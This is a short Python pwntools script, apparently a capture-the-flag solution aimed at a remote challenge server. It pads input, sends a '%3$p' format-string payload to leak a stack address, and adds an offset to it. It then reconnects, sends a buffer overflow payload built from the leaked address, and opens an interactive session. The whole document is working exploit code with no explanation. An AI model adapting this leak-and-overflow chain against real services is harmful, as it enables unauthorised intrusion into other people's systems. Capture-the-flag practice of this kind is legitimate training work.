from pwn import *
import time
from binascii import unhexlify
p = remote('0.cloud.chals.io', 26008)
pad_input = 32*b"A"

pad_some_structs = 9*b"B"
find_address = b"%3$p"

pad_structs = 20*b"B"

payload_find = pad_input + pad_some_structs + find_address
p.sendline(payload_find)
find_address = p.recvuntil(b"0x")
find_address = p32(int("0x"+p.recvline().decode().split(" ")[0], 16) + 0x20)
print(find_address)

p.close()
p = remote('0.cloud.chals.io', 26008)

payload_insert = pad_input + pad_structs + find_address
p.sendline(payload_insert)
time.sleep(1)
p.interactive()
